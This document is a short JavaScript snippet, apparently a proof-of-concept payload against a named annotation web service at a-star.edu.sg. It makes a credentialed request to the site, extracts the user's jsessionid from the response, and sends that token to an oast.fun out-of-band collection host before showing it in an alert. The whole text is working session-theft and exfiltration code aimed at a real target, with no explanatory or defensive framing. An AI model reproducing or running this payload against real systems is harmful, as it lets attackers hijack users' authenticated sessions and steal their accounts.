// Step 1: Send GET request to retrieve jsessionid
var xhr1 = new XMLHttpRequest();
xhr1.open('GET', 'https://annotator.bii.a-star.edu.sg/annie/ShowObject.do?print=true&view_state=page_size%3E100%7Curn%3Ebio%3Aset%3Acbs%3Apublic%7Cpage%3E0%7Cview_param%3Edefault%7Cresult_visibility%3Eall%7Cnav_bar_size%3E5%7Ctree_open%3Ef&bust', true);
xhr1.withCredentials = true;
xhr1.onreadystatechange = function () {
    if (xhr1.readyState === XMLHttpRequest.DONE) {
        if (xhr1.status === 200) {
            // Extract jsessionid from response
            var responseText = xhr1.responseText;
            var jsessionidIndex = responseText.indexOf('jsessionid="');
            if (jsessionidIndex !== -1) {
                jsessionidIndex += 'jsessionid="'.length;
                var jsessionidEndIndex = responseText.indexOf('"', jsessionidIndex);
                if (jsessionidEndIndex !== -1) {
                    var grabbedToken = responseText.substring(jsessionidIndex, jsessionidEndIndex);

                    // Step 2: Send GET request to vfibxnzplgyulzvoqrzb7aj742b30m139.oast.fun with grabbed token
                    var xhr2 = new XMLHttpRequest();
                    xhr2.open('GET', 'https://vfibxnzplgyulzvoqrzb7aj742b30m139.oast.fun/?token=' + grabbedToken, true);
                    xhr2.onreadystatechange = function () {
                        if (xhr2.readyState === XMLHttpRequest.DONE && xhr2.status === 200) {
                            // Step 3: Alert grabbed token
                            alert("Grabbed Token: " + grabbedToken);
                        }
                    };
                    xhr2.send();
                }
            } else {
                console.error('jsessionid variable not found in response.');
            }
        } else {
            console.error('XHR1 failed with status:', xhr1.status);
        }
    }
};
xhr1.send();
